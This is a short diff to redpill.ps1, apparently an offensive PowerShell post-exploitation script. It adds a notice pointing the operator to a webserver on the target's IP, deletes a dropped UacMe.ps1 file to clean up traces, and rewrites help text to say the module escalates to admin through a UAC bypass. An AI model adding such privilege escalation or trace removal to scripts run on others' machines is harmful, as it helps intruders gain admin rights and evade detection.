@@ -1006,8 +1006,11 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
 
    ## Run auxiliary module
    powershell -File "$Env:TMP\StartWebServer.ps1" -StartWebServer $StartWebServer -SPort $SPort
+   Write-Host "[success] Access remote WebServer on: http://<targetIP>:$SPort/" -ForegroundColor Green -BackgroundColor Black
+   Write-Host ""
 
    ## Clean Old files left behind
+   If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
    If(Test-Path -Path "$Env:TMP\webserver.ps1"){Remove-Item -Path "$Env:TMP\webserver.ps1" -Force}
    If(Test-Path -Path "$Env:TMP\StartWebServer.ps1"){Remove-Item -Path "$Env:TMP\StartWebServer.ps1" -Force}
    If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1"){Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force}
@@ -3561,12 +3564,12 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell
       Downloads Start-WebServer.ps1 and executes the webserver.
-      Remark: Admin privileges are requiered in shell to run the WebServer
+      Remark: This module uses UacMe (EOP) to elevate cmdlet privs to admin
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell -SPort 8087
       Downloads Start-WebServer.ps1 and executes the webserver on port 8087
-      Remark: Admin privileges are requiered in shell to run the WebServer
+      Remark: This module uses UacMe (EOP) to elevate cmdlet privs to admin
    #>!bye..
 
 "@;
